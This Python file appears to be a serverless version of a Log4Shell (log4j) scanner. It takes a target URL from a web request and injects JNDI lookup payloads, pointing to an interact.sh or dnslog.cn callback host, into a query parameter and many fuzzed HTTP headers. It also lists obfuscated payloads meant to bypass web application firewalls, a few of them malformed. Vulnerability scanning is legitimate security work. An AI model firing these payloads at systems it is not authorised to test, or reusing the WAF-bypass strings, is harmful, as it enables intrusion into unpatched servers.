# -*- coding: utf-8 -*-

import requests
import time
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

try:
    import requests.packages.urllib3

    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

default_headers = {
    'User-Agent': 'log4j-scan',
    'Accept': '*/*'
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 4
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}"]


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open("./headers.txt", "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})

    fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payloads = [payload]

    for payload in payloads:
        try:
            requests.request(url=url,
                             method="GET",
                             params={"v": payload},
                             headers=get_fuzzing_headers(payload),
                             verify=False,
                             timeout=timeout)
        except Exception as e:
            print(f"EXCEPTION: {e}")


def main(url):
    urls = []
    urls.append(url)

    dns_callback = Interactsh()
    # dns_callback = Dnslog()
    dns_callback_host = dns_callback.domain

    for url in urls:
        print(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host)

    wait_time = 5
    time.sleep(wait_time)
    records = dns_callback.pull_logs()

    if len(records) == 0:
        result = "Target may not be vulnerable"
    else:
        result = "Target is vulnerable"
    return result


def handler(event, context):
    url = event['queryStringParameters']['url']

    result = main(url)
    response_body = {
        "url": url,
        "result": result
    }
    return {
        "statusCode": 200,
        "headers": {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",

        },
        "body": json.dumps(response_body)
    }
